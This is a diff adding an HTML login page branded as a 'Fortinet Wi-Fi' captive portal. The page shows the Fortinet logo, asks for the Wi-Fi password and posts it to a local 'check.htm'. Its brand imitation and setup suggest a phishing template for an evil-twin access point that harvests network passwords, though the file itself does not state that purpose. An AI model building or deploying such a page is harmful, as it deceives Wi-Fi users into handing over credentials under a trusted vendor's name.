@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Welcome to Fortinet Wi-Fi</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="portal-container">
+        <!-- Logo -->
+        <div class="logo">
+            <img src="images/fortinet-logo.png" alt="Fortinet Logo" />
+        </div>
+
+        <!-- Welcome Content -->
+        <h1>Connect to Wi-Fi</h1>
+        <p>Please enter your credentials to continue.</p>
+
+        <!-- Login Form -->
+        <form id="loginForm" method="POST" action="check.htm">
+            <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Wi-Fi Password"
+                required
+            />
+            <button type="submit">Connect</button>
+        </form>
+
+        <!-- Optional message area -->
+        <div id="message"></div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
